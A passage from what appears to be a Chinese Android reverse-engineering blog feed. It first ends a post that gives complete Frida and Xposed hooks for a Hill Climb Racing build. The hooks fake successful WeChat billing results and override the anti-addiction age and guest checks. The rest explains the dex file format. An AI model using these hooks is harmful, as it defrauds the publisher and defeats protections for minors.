class="string">&quot;BillingWrapperWeChat.checkIfOkToContinuePaymentPaymentSpecificRequirements result=&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">BillingResult</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.mygamez.billing.BillingResult&quot;</span>);</span><br><span class="line">    <span class="title class_">BillingResult</span>[<span class="string">&quot;getResultCode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;BillingResult.getResultCode is called&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;getResultCode&quot;</span>]();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;BillingResult.getResultCode result=&quot;</span> + result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此时已经破解完成, 接下来将frida代码转为xposed</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.fingersoft.hillclimb.noncmcc&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook MyStartActivity.loginActivityExists</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(<span class="string">&quot;com.mygamez.common.MyStartActivity&quot;</span>, lpparam.classLoader, <span class="string">&quot;loginActivityExists&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;loginActivityExists is called&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;loginActivityExists result=&quot;</span> + param.getResult());</span><br><span class="line">                param.setResult(<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook AntiAddictionManager$AntiAddictionManagerInstance.isGuestMode</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(<span class="string">&quot;com.mygamez.common.antiaddiction.AntiAddictionManager$AntiAddictionManagerInstance&quot;</span>, lpparam.classLoader, <span class="string">&quot;isGuestMode&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;isGuestMode is called&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                param.setResult(<span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook AntiAddictionManager$AntiAddictionManagerInstance.getUserAge</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(<span class="string">&quot;com.mygamez.common.antiaddiction.AntiAddictionManager$AntiAddictionManagerInstance&quot;</span>, lpparam.classLoader, <span class="string">&quot;getUserAge&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;getUserAge is called&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;getUserAge result=&quot;</span> + param.getResult());</span><br><span class="line">                param.setResult(<span class="number">20</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook BillingWrapperWeChat.checkIfOkToContinuePaymentPaymentSpecificRequirements</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(<span class="string">&quot;com.mygamez.billing.BillingWrapperWeChat&quot;</span>, lpparam.classLoader, <span class="string">&quot;checkIfOkToContinuePaymentPaymentSpecificRequirements&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;checkIfOkToContinuePaymentPaymentSpecificRequirements is called&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;checkIfOkToContinuePaymentPaymentSpecificRequirements result=&quot;</span> + param.getResult());</span><br><span class="line">                param.setResult(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook BillingResult.getResultCode</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(<span class="string">&quot;com.mygamez.billing.BillingResult&quot;</span>, lpparam.classLoader, <span class="string">&quot;getResultCode&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;getResultCode is called&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;getResultCode result=&quot;</span> + param.getResult());</span><br><span class="line">                param.setResult(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装并启用模块</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-12_111524.png" alt=""></p>]]></content>
    
    
    <summary type="html">xposed</summary>
    
    
    
    <category term="android" scheme="https://ixout.github.io/categories/android/"/>
    
    
    <category term="xposed" scheme="https://ixout.github.io/tags/xposed/"/>
    
  </entry>
  
  <entry>
    <title>dex结构</title>
    <link href="https://ixout.github.io/posts/44787/"/>
    <id>https://ixout.github.io/posts/44787/</id>
    <published>2024-10-05T07:27:27.000Z</published>
    <updated>2025-03-12T03:21:10.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>整个dex文件可以看作一个dex结构体的实例, 结构体使用 c 语言实现</p><p>dex结构体的源码位于</p><ul><li><code>art/libdexfile/dex/dex_file.h</code>(新目录)</li><li><code>dalvik/libdex/DexFile.h</code>(较旧版本)</li></ul><p>了解dex结构体是是否有必要的, 特别在加固与脱壳的领域</p><p>整体参考图(与现版本有些许差异)</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/DexFile.png" alt=""></p><p>对应</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFile</span> &#123;</span></span><br><span class="line">    <span class="comment">/* odex文件头 */</span></span><br><span class="line">    <span class="type">const</span> DexOptHeader* pOptHeader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dex文件结构 */</span></span><br><span class="line">    <span class="type">const</span> DexHeader*    pHeader;</span><br><span class="line">    <span class="type">const</span> DexStringId*  pStringIds;</span><br><span class="line">    <span class="type">const</span> DexTypeId*    pTypeIds;</span><br><span class="line">    <span class="type">const</span> DexFieldId*   pFieldIds;</span><br><span class="line">    <span class="type">const</span> DexMethodId*  pMethodIds;</span><br><span class="line">    <span class="type">const</span> DexProtoId*   pProtoIds;</span><br><span class="line">    <span class="type">const</span> DexClassDef*  pClassDefs;</span><br><span class="line">    <span class="type">const</span> DexLink*      pLinkData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*辅助数据段,记录dex文件被优化后添加的一些信息*/</span></span><br><span class="line">    <span class="type">const</span> DexClassLookup* pClassLookup;</span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>*         pRegisterMapPool;      </span><br><span class="line">    <span class="type">const</span> u1*           baseAddr;</span><br><span class="line">    <span class="type">int</span>                 overhead;</span><br><span class="line">    <span class="comment">//void*               auxData;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用工具010 editor的模板功能, 能够十分有效的帮助我们学习dex结构体</p><p>使用以下源码得到的dex文件作为学习案例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hello</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNumber</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">ahello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> add(<span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The result of addition is: &quot;</span> + result);</span><br><span class="line">        System.out.println(<span class="string">&quot;The number in the object is: &quot;</span> + ahello.getNumber());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过以下指令得到目标文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac ./Hello.java</span><br><span class="line">AndroidSDKVersion/d8.bat --ouput . .\Hello.class</span><br></pre></td></tr></table></figure><p>使用010editor打开</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-05_115757.png" alt=""></p><h1 id="leb128"><a href="#leb128" class="headerlink" title="leb128"></a>leb128</h1><p>为了节省内存dex文件中会对部分整数使用可变长度编码</p><div class="table-container"><table><thead><tr><th style="text-align:left">名称</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">sleb128</td><td>有符号 LEB128，可变长度（见下文）</td></tr><tr><td style="text-align:left">uleb128</td><td>无符号 LEB128，可变长度（见下文）</td></tr><tr><td style="text-align:left">uleb128p1</td><td>无符号 LEB128 加 <code>1</code>，可变长度（见下文）</td></tr></tbody></table></div><p>每个 LEB128 编码值均由 1-5 个字节组成，共同表示一个 32 位的值。每个字节均已设置其最高有效位（序列中的最后一个字节除外，其最高有效位已清除）。每个字节的剩余 7 位均为载荷，即第一个字节中有 7 个最低有效位，第二个字节中也是 7 个，依此类推。</p><p>对于有符号 LEB128 (<code>sleb128</code>)，序列中最后一个字节的最高有效载荷位会进行符号扩展，以生成最终值。在无符号情况 (<code>uleb128</code>) 下，任何未明确表示的位都会被解译为 <code>0</code>。</p><p>变体 <code>uleb128p1</code> 用于表示一个有符号值，其表示法是编码为 <code>uleb128</code> 的值加 1。这使得 <code>-1</code> 的编码（或被视为无符号值 <code>0xffffffff</code>）成为一个单字节（但没有任何其他负数），并且该编码在下面这些情况下非常实用：所表示的数值必须为非负数或 <code>-1</code>（或 <code>0xffffffff</code>）；不允许任何其他负值（或不太可能需要使用较大的无符号值）。</p><div class="table-container"><table><thead><tr><th style="text-align:left">编码序列</th><th style="text-align:left">As <code>sleb128</code></th><th style="text-align:left">As <code>uleb128</code></th><th style="text-align:left">编码为 <code>uleb128p1</code></th></tr></thead><tbody><tr><td style="text-align:left">00</td><td style="text-align:left">0</td><td style="text-align:left">0</td><td style="text-align:left">-1</td></tr><tr><td style="text-align:left">01</td><td style="text-align:left">1</td><td style="text-align:left">1</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">7f</td><td style="text-align:left">-1</td><td style="text-align:left">127</td><td style="text-align:left">126</td></tr><tr><td style="text-align:left">80 7f</td><td style="text-align:left">-128</td><td style="text-align:left">16256</td><td style="text-align:left">16255</td></tr></tbody></table></div><h1 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h1><p>header用于描述dex文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**************************************************** </span></span><br><span class="line"><span class="comment">dex文件头 </span></span><br><span class="line"><span class="comment">****************************************************/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexHeader</span> &#123;</span></span><br><span class="line">    u1  magic[<span class="number">8</span>];           <span class="comment">/* dex版本标识  dex.035=&gt;64 65 78 0a 30 33 35 00 */</span></span><br><span class="line">    u4  checksum;           <span class="comment">/* adler32 校验 checksum段为dex文件的校验和，通过它来判断dex文件是否被损坏或篡改 */</span></span><br><span class="line">    u1  signature[<span class="number">20</span>]; <span class="comment">/* SHA-1 hash */</span></span><br><span class="line">    u4  fileSize;           <span class="comment">/* 整个文件大小 */</span></span><br><span class="line">    u4  headerSize;         <span class="comment">/* DexHeader结构大小0x70 */</span></span><br><span class="line">    u4  endianTag;<span class="comment">/* 字节序标记*/</span></span><br><span class="line">    u4  linkSize;           <span class="comment">/* 链接段大小*/</span></span><br><span class="line">    u4  linkOff;            <span class="comment">/* 链接段偏移*/</span>   </span><br><span class="line"></span><br><span class="line">    u4  mapOff;             <span class="comment">/* DexMapList的文件偏移*/</span></span><br><span class="line"></span><br><span class="line">    u4  stringIdsSize;      <span class="comment">/* DexStringId的个数*/</span></span><br><span class="line">    u4  stringIdsOff;       <span class="comment">/* DexStringId的文件偏移*/</span></span><br><span class="line"></span><br><span class="line">    u4  typeIdsSize;<span class="comment">/* DexTypeId的个数*/</span></span><br><span class="line">    u4  typeIdsOff;<span class="comment">/* DexTypeId的文件偏移*/</span></span><br><span class="line"></span><br><span class="line">    u4  protoIdsSize;       <span class="comment">/* DexProtoId的个数*/</span></span><br><span class="line">    u4  protoIdsOff; <span class="comment">/* DexProtoId的文件偏移*/</span></span><br><span class="line"></span><br><span class="line">    u4  fieldIdsSize;<span class="comment">/* DexFieldId的个数*/</span></span><br><span class="line">    u4  fieldIdsOff;<span class="comment">/* DexFieldId的文件偏移*/</span></span><br><span class="line"></span><br><span class="line">    u4  methodIdsSize;<span class="comment">/* DexMethodId的个数*/</span></span><br><span class="line">    u4  methodIdsOff;<span class="comment">/* DexMethodId的文件偏移*/</span></span><br><span class="line"></span><br><span class="line">    u4  classDefsSize;<span class="comment">/* DexClassDef的个数*/</span></span><br><span class="line">    u4  classDefsOff;       <span class="comment">/* DexClassDef的文件偏移*/</span></span><br><span class="line"></span><br><span class="line">    u4  dataSize;           <span class="comment">/* 数据段的大小*/</span></span><br><span class="line">    u4  dataOff;<span class="comment">/* 数据段的文件偏移*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>magic</strong></p><p>magic字段格式一般是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;dex\x0a035\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>其中035会随着dex文件版本发生变化</p><p>例如也有可能是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;dex\x0a038\x00&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>checksum</strong></p><p>用于校验dex完整性</p><p><strong>signature</strong></p><p>20字节的SHA-1哈希</p><p><strong>file_size</strong></p><p>整个文件的大小</p><p><strong>header_size</strong></p><p>头部大小</p><p><strong>endian_tag</strong></p><p>标识字节序</p><ul><li>小端序<code>0x78563412</code></li><li>大端序<code>0x12345678</code></li></ul><p>以上这些在案例中的实例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-05_140449.png" alt=""></p><p><strong>link</strong></p><p><code>link_size</code> 与 <code>link_off</code>用于标明链接段</p><p>大多数时候皆为空(例如案例中), 不作多关注</p><h1 id="map-off"><a href="#map-off" class="headerlink" title="map_off"></a>map_off</h1><p>DexMapList的偏移</p><p>DexMapList描述了整个dex文件的布局</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapList</span> &#123;</span></span><br><span class="line">    u4  size;               <span class="comment">/* DexMapItem的个数 */</span></span><br><span class="line">    DexMapItem <span class="built_in">list</span>[<span class="number">1</span>];     <span class="comment">/* DexMapItem结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapItem</span> &#123;</span></span><br><span class="line">    u2 type;              <span class="comment">/* kDexType开头的类型 */</span></span><br><span class="line">    u2 unused;  <span class="comment">/* 未使用，用于字节对齐 */</span></span><br><span class="line">    u4 size;              <span class="comment">/* DexMapItem中的size字段指定了特定类型的个数，它们以特定的类型在dex文件中连续存放 */</span></span><br><span class="line">    u4 offset;            <span class="comment">/* 指定类型数据的文件偏移 offset为该类型的文件起始偏移地址*/</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* DexMapItem的类型(type) */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    kDexTypeHeaderItem               = <span class="number">0x0000</span>, <span class="comment">//模式整个DexHeader结构，它占用了文件的前0x70个字节的空间</span></span><br><span class="line">    kDexTypeStringIdItem             = <span class="number">0x0001</span>, <span class="comment">//stringIdsSize stringIdsSize </span></span><br><span class="line">    kDexTypeTypeIdItem               = <span class="number">0x0002</span>, <span class="comment">//typeIdsSize typeIdsOff</span></span><br><span class="line">    kDexTypeProtoIdItem              = <span class="number">0x0003</span>, <span class="comment">//protoIdsSize protoIdsOff</span></span><br><span class="line">    kDexTypeFieldIdItem              = <span class="number">0x0004</span>, <span class="comment">//fieldIdsSize fieldIdsSize</span></span><br><span class="line">    kDexTypeMethodIdItem             = <span class="number">0x0005</span>, <span class="comment">//methodIdsSize methodIdsOff</span></span><br><span class="line">    kDexTypeClassDefItem             = <span class="number">0x0006</span>, <span class="comment">//classDefsSize classDefsOff  指向的结构体为DexClassDef</span></span><br><span class="line"></span><br><span class="line">    kDexTypeMapList                  = <span class="number">0x1000</span>, <span class="comment">//DexMapItem结构</span></span><br><span class="line">    kDexTypeTypeList                 = <span class="number">0x1001</span>, <span class="comment">//DexTypeList结构</span></span><br><span class="line">    kDexTypeAnnotationSetRefList     = <span class="number">0x1002</span>, </span><br><span class="line">    kDexTypeAnnotationSetItem        = <span class="number">0x1003</span>, </span><br><span class="line"></span><br><span class="line">    kDexTypeClassDataItem            = <span class="number">0x2000</span>, <span class="comment">//DexClassData结构</span></span><br><span class="line">    kDexTypeCodeItem                 = <span class="number">0x2001</span>, <span class="comment">//DexCode结构</span></span><br><span class="line">    kDexTypeStringDataItem           = <span class="number">0x2002</span>, <span class="comment">//指向DexStringId字符串列表的首地址</span></span><br><span class="line">    kDexTypeDebugInfoItem            = <span class="number">0x2003</span>, <span class="comment">//调式信息偏移</span></span><br><span class="line">    kDexTypeAnnotationItem           = <span class="number">0x2004</span>, </span><br><span class="line">    kDexTypeEncodedArrayItem         = <span class="number">0x2005</span>, </span><br><span class="line">    kDexTypeAnnotationsDirectoryItem = <span class="number">0x2006</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-05_141452.png" alt=""></p><h1 id="string-id"><a href="#string-id" class="headerlink" title="string_id"></a>string_id</h1><p><strong>string_idx_size</strong></p><p>描述DexStringId的个数</p><p><strong>string_idx_off</strong></p><p>DexStringId的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexStringId</span> &#123;</span></span><br><span class="line">    u4 stringDataOff;      <span class="comment">/* 字符串数据偏移 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是黄色的这部分</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-05_141816.png" alt=""></p><p>其描述的是一个stringData的偏移</p><p>例如第一个偏移是<code>0x332</code></p><p>对应内容是<img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-05_142108.png" alt=""></p><p>代表该字符串共有6个字符(注意并不是6个字节), 其中不包括结尾的<code>\x00</code></p><p>所有的字符串按顺序排列生成一个索引</p><p><img src="C:\Users\Aichengchao\AppData\Roaming\Typora\typora-user-images\image-20250305142952451.png" alt="image-20250305142952451"></p><h1 id="type-id"><a href="#type-id" class="headerlink" title="type_id"></a>type_id</h1><p><strong>type_ids_size</strong></p><p>描述DexTypeId的个数</p><p><strong>type_ids_off</strong></p><p>指向类型描述符id的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeId</span> &#123;</span></span><br><span class="line">    u4  descriptorIdx;      